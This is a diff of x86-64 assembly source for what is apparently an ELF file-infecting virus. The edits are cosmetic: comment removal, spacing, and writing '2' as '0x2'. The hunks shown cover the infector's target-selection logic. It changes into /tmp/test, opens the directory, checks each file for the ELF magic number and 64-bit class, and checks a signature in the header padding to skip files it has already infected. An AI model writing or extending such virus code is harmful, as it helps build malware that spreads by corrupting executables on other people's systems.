@@ -31,7 +31,7 @@
 %define PF_X	1
 %define PF_R	4
 
-; ***  r15 offsets  ****
+; ***  r15 offsets****
 ; 0 = stack buffer = stat
 ; 48 = stat.st_size
 
@@ -75,10 +75,10 @@ _start:
 		mov rax, SYS_CHDIR
 		syscall
 	call set_folder ;/tmp/test
-	dirent:                                            ; pushing "." to stack (rsp)
-		pop rdi                                           ; moving "." to rdi
+	dirent:
+		pop rdi
 		mov rsi, O_RDONLY
-		xor rdx, rdx                                            ; not using any flags
+		xor rdx, rdx
 		mov rax, SYS_OPEN
 		syscall
 
@@ -126,7 +126,7 @@ _start:
 		.is_elf_64:
 			cmp dword [r15 + 144], 0x464c457f                   ; 0x464c457f means .ELF (little-endian)
 			jnz .close_file  
-			cmp byte [r15 + 148], 2                    ; check if target ELF is 64bit
+			cmp byte [r15 + 148], 0x2                    ; check if target ELF is 64bit
 			jne .close_file
         .is_infected:
             cmp dword [r15 + 152], SIGNATURE                   ; check signature in [r15 + 152] ehdr.pad (DRE in little-endian, plus trailing zero to fill up a word size)
